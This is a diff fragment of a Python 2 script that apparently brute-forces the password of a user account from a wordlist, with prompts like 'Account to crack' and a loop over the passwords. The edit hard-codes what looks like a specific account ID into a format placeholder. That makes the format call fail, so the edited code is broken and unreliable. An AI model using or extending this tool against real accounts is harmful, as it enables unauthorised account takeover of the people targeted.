@@ -32,7 +32,7 @@ try:
 	passlist = raw_input("[*] Set PATH to passlist: ")
 	if os.path.exists(passlist) != False:
 		print(__banner__)
-		print(" [+] Account to crack : {}".format(userid))
+		print(" [+] Account to crack : {100044822919091}".format(userid))
 		print(" [+] Loaded : {}".format(len(open(passlist,"r").read().split("\n"))))
 		print(" [+] Cracking, please wait ...")
 		for passwd in open(passlist,'r').readlines():
